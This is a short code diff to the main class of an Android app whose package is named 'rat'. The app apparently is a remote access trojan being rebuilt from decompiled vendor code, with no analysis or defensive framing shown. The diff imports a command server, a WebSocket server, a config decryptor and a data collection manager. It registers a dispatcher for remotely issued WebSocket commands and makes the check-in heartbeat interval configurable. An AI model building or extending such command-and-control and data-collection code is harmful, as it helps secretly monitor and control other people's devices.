@@ -12,6 +12,7 @@ import android.util.Log;
 
 import com.vendor.rat.config.AppConfig;
 import com.vendor.rat.config.ConfigDecryptor;
+import com.vendor.rat.control.handler.CommandDispatcher;
 import com.vendor.rat.control.server.HttpCommandServer;
 import com.vendor.rat.control.server.LocalWebSocketServer;
 import com.vendor.rat.data.collector.DataCollectionManager;
@@ -165,8 +166,9 @@ public class MainApplication {
             if (this.heartThread == null) {
                 KeepHeartThread kht = new KeepHeartThread();
                 this.heartThread = kht;
-                new Timer().schedule(kht, 10000L, 10000L);
-                Log.d(TAG, "KeepHeartThread scheduled (10s, 10s)");
+                long interval = config.getHeartbeatInterval() * 1000L;
+                new Timer().schedule(kht, interval, interval);
+                Log.d(TAG, "KeepHeartThread scheduled (" + interval + "ms)");
             }
 
             // 7. FIX-11: 初始 API 请求 (vendor: 行 848-850)
@@ -212,6 +214,11 @@ public class MainApplication {
             config.getWebSocketUrl(),
             config.getDeviceId(application)
         );
+
+        // 注册 CommandDispatcher 为唯一的 WebSocket 命令监听器
+        CommandDispatcher dispatcher = new CommandDispatcher();
+        dispatcher.register();
+        Log.d(TAG, "CommandDispatcher registered as WebSocket listener");
     }
 
     // ============ FIX-11: 初始 API 请求 ============
